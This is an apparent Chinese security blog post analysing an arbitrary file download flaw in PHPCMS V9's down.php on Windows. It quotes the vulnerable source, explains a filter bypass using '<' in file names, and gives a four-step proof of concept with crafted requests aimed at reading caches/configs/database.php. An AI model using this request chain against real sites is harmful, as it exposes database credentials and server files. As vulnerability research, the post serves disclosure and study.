<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> PHPCMS V9 任意文件下载(Windows) · WangEX`s Blog</title><meta name="description" content="PHPCMS V9 任意文件下载(Windows) - wangex"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://goodwaf.com/atom.xml" title="WangEX`s Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">PHPCMS V9 任意文件下载(Windows)</h1><div class="post-info">2017年4月21日</div><div class="post-content"><h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><p>任意文件下载漏洞和<a href="http://paper.seebug.org/275/" target="_blank" rel="external">《PHPCMS v9.6.0 wap模块 SQL注入》</a>在同一个文件，只不过触发点在download函数。<br><a id="more"></a></p>
<h4 id="二、详情"><a href="#二、详情" class="headerlink" title="二、详情"></a>二、详情</h4><p>漏洞文件在phpcms\modules\content\down.php，漏洞触发函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</div><div class="line">		$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">		$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</div><div class="line">		$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, $pc_auth_key);</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		<span class="keyword">unset</span>($i,$m,$f,$t,$ip);</div><div class="line">		parse_str($a_k);</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $downid = intval($i);</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">		<span class="keyword">if</span>(!$i || $m&lt;<span class="number">0</span>) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($t)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($ip)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">		$starttime = intval($t);</div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$f) || strpos($f, <span class="string">":\\"</span>)!==<span class="keyword">FALSE</span> || strpos($f,<span class="string">'..'</span>)!==<span class="keyword">FALSE</span>) showmessage(L(<span class="string">'url_error'</span>));</div><div class="line">		$fileurl = trim($f);</div><div class="line">		<span class="keyword">if</span>(!$downid || <span class="keyword">empty</span>($fileurl) || !preg_match(<span class="string">"/[0-9]&#123;10&#125;/"</span>, $starttime) || !preg_match(<span class="string">"/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/"</span>, $ip) || $ip != ip()) showmessage(L(<span class="string">'illegal_parameters'</span>));	</div><div class="line">		$endtime = SYS_TIME - $starttime;</div><div class="line">		<span class="keyword">if</span>($endtime &gt; <span class="number">3600</span>) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">		<span class="keyword">if</span>($m) $fileurl = trim($s).trim($fileurl);</div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$fileurl) ) showmessage(L(<span class="string">'url_error'</span>));</div><div class="line">		<span class="comment">//远程文件</span></div><div class="line">		<span class="keyword">if</span>(strpos($fileurl, <span class="string">':/'</span>) &amp;&amp; (strpos($fileurl, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>)) === <span class="keyword">false</span>)) &#123; </div><div class="line">			header(<span class="string">"Location: $fileurl"</span>);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">if</span>($d == <span class="number">0</span>) &#123;</div><div class="line">				header(<span class="string">"Location: "</span>.$fileurl);</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$fileurl = str_replace(<span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>),<span class="string">'/'</span>), <span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>),DIRECTORY_SEPARATOR), $fileurl);</div><div class="line">				$filename = basename($fileurl);</div><div class="line">				<span class="comment">//处理中文文件</span></div><div class="line">				<span class="keyword">if</span>(preg_match(<span class="string">"/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/"</span>, $fileurl)) &#123;</div><div class="line">					$filename = str_replace(<span class="keyword">array</span>(<span class="string">"%5C"</span>, <span class="string">"%2F"</span>, <span class="string">"%3A"</span>), <span class="keyword">array</span>(<span class="string">"\\"</span>, <span class="string">"/"</span>, <span class="string">":"</span>), urlencode($fileurl));</div><div class="line">					$filename = urldecode(basename($filename));</div><div class="line">				&#125;</div><div class="line">				$ext = fileext($filename);</div><div class="line">				$filename = date(<span class="string">'Ymd_his'</span>).random(<span class="number">3</span>).<span class="string">'.'</span>.$ext;</div><div class="line">				file_down($fileurl, $filename);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>这个函数用于下载文件，其基本流程是：从外部获取a_k参数 -&gt;  解密a_k字符串 -&gt; parse_str注册变量，假设我们可以控制a_k参数，那么就可以将我们的payload带入，实现任意文件下载。（上文中后续代码会对下载文件的后缀进行检测，在Windows下可以通过”&lt;”符号来匹配文件，例如index.php可以使用index.ph&lt;来完成绕过）</p>
<p>然后再看同一文件里的init函数的最后几行，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$f) || strpos($f, <span class="string">":\\"</span>)!==<span class="keyword">FALSE</span> || strpos($f,<span class="string">'..'</span>)!==<span class="keyword">FALSE</span>) showmessage(L(<span class="string">'url_error'</span>));</div><div class="line"><span class="keyword">if</span>(strpos($f, <span class="string">'http://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'ftp://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'://'</span>) === <span class="keyword">FALSE</span>) &#123;</div><div class="line">	$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</div><div class="line">	$a_k = urlencode(sys_auth(<span class="string">"i=$i&amp;d=$d&amp;s=$s&amp;t="</span>.SYS_TIME.<span class="string">"&amp;ip="</span>.ip().<span class="string">"&amp;m="</span>.$m.<span class="string">"&amp;f=$f&amp;modelid="</span>.$modelid, <span class="string">'ENCODE'</span>, $pc_auth_key));</div><div class="line">	$downurl = <span class="string">'?m=content&amp;c=down&amp;a=download&amp;a_k='</span>.$a_k;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$downurl = $f;			</div><div class="line">&#125;</div><div class="line"><span class="keyword">include</span> template(<span class="string">'content'</span>,<span class="string">'download'</span>);</div></pre></td></tr></table></figure></p>
<p>可以看到这里通过将多个变量拼接后加密生成了变量$a_k并作为下载链接返回到了客户端，所以我们需要再想办法控制这些变量。看该函数的头几行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">unset</span>($i,$m,$f);</div><div class="line">	parse_str($a_k);</div></pre></td></tr></table></figure></p>
<p>这些变量的值还是来自外部的a_k参数，然后解密并由parse_str注册而成。这里就回到了<a href="http://paper.seebug.org/275/" target="_blank" rel="external">《PHPCMS v9.6.0 wap模块 SQL注入》</a>漏洞的触发处。但是我们这里我们并不要sql注入，而是让程序继续往下执行完成文件下载功能。之前的步骤可参考<a href="http://paper.seebug.org/275/" target="_blank" rel="external">《PHPCMS v9.6.0 wap模块 SQL注入》</a>，在此略过。</p>
<h4 id="三、验证"><a href="#三、验证" class="headerlink" title="三、验证"></a>三、验证</h4><ul>
<li><p>step 1: 通过访问wap模块拿到加密后的cookie</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1/index.php?m=wap&amp;c=index&amp;siteid=1</div></pre></td></tr></table></figure>
</li>
<li><p>step 2: 将上面得到的加密cookie作为userid_flash的值，并带上payload访问swfupload_json函数</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">URL</span>:  127.0.0.1/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3D1%26m%3D1%26f%3Dcaches%2fconfigs%2fdatabase.ph%253C%26modelid%3D1%26catid%3D1%26s%3D%26i%3D1%26d%3D1%26</div><div class="line"><span class="attribute">POST</span>: userid_flash=3254G0WHf0Ezjn-F0XeGWGKAFzbQIG74zvdPJNuj</div></pre></td></tr></table></figure>
</li>
</ul>
<p>其中payload是经过url编码的，解码后为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=1&amp;m=1&amp;f=caches/configs/database.ph%3C&amp;modelid=1&amp;catid=1&amp;s=&amp;i=1&amp;d=1&amp;</div></pre></td></tr></table></figure></p>
<ul>
<li><p>step 3: 将上面得到的加密cookie作为参数a_k的值再访问init函数</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1/index.php?m=content&amp;c=down&amp;a_k=6f01j0SKUOgHPwRUwo6buVR4uKU5RZKWguMoCL58JF9yD_B57-gpUqzVCPhzbnoULuANgKs7vHf437EIG24Qu07ExowlP1C99QVpP4aQ-19rFRbDE6OsOifqnBnoCjyxn-D2oZ9Ey0ec7BjM5TkJjweVmKnXtM2iSIkyu5jdyMndQ8YL8SE</div></pre></td></tr></table></figure>
</li>
<li><p>step 4: 直接点击页面中的下载链接，即可下载。</p>
</li>
</ul>
</div></article></div></main><footer><div class="paginator"><a href="/2017/04/21/phpcms_xss/" class="prev">PREV</a><a href="/2017/02/18/jieqicms_sqli/" class="next">NEXT</a></div><div data-thread-key="2017/04/21/phpcms_file_down/" data-title="PHPCMS V9 任意文件下载(Windows)" data-url="http://goodwaf.com/2017/04/21/phpcms_file_down/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
(function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
     || document.getElementsByTagName('body')[0]).appendChild(ds);
})();

</script><div class="copyright"><p>© 2015 - 2017 <a href="http://goodwaf.com">wangex</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>